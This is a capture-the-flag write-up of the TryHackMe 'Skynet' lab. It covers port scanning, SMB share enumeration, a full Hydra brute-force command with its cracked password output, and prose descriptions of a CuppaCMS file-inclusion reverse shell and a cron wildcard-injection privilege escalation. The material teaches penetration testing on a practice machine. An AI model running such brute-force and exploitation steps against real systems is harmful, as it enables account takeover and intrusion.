---
description: https://tryhackme.com/room/skynet
---

# 🎿 Skynet

## Writeup/Walkthrough

### Task 1: Initial Enumeration

The first step is to perform an initial enumeration using the Nmap tool. The results show an Ubuntu Linux machine with various open ports, including SSH, HTTP, POP3, IMAP, and SMB. Notably, the HTTP service is running on port 80.

```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL CAPA AUTH-RESP-CODE PIPELINING TOP UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: Pre-login capabilities ENABLE LOGIN-REFERRALS ID SASL-IR have OK LOGINDISABLEDA0001 post-login listed LITERAL+ IMAP4rev1 IDLE more
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:8E:4C:0C:07:19 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 2: SMB Enumeration

The next step involves using `enum4linux` to enumerate the SMB service. Two shares are discovered: "Anonymous" and "milesdyson." While the "Anonymous" share is accessible without a password, the "milesdyson" share requires authentication.

```
root@ip-10-10-58-139:~# smbclient -L //10.10.194.35
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

Connecting to the "Anonymous" share reveals files containing information about the SMB password being changed. The potential username is "milesdyson," and a wordlist is found in the file `log1.txt`.

```
root@ip-10-10-58-139:~# smbclient //10.10.194.35/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5809964 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (79.6 KiloBytes/sec) (average 79.6 KiloBytes/sec)

cd into the log file and retrieve the files:

smb: \> cd logs\
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5809636 blocks available
smb: \logs\> get logs1.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \logs\logs1.txt
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (230.0 KiloBytes/sec) (average 230.0 KiloBytes/sec)
```

### Task 3: Web Server Enumeration

Dirb is used to scan the web server for hidden directories. A hidden directory, "/squirrelmail," is discovered. Further investigation reveals a login page. Hydra is employed to brute force the login page using the username "milesdyson" and the password list from `log1.txt`.

```
root@ip-10-10-58-139:~# hydra -l milesdyson -P log1.txt 10.10.194.35 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
```

### Task 4: Email Password Retrieval

The brute force attack is successful, and the password for Miles's emails is found to be "cyborg007haloterminator." Using this password, access is gained to the email account.

```
[80][http-post-form] host: 10.10.194.35   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
```

### Task 5: Hidden Directory and Web Application Exploitation

The hidden directory "/45kra24zxs28v3yd" is discovered. Dirb is used again to find additional hidden directories, revealing "/administrator" running CuppaCMS. A searchsploit query identifies a vulnerability related to Remote File Inclusion (RFI).

### Task 6: Exploiting RFI for Reverse Shell

The RFI vulnerability is exploited by downloading a PHP reverse shell from revshells.com. A local HTTP server is started, and the reverse shell is requested from the target machine using the provided link.

### Task 7: Privilege Escalation

A shell is obtained, and further enumeration reveals the user flag in "/home/milesdyson." In the "/home/milesdyson/backups" directory, a script named "backup.sh" is found, executed every minute. Wildcard injection is used to append commands to the script, ultimately leading to a root shell.

### Task 8: Root Flag

With root access, the root flag is located in "/root/root.txt."

###
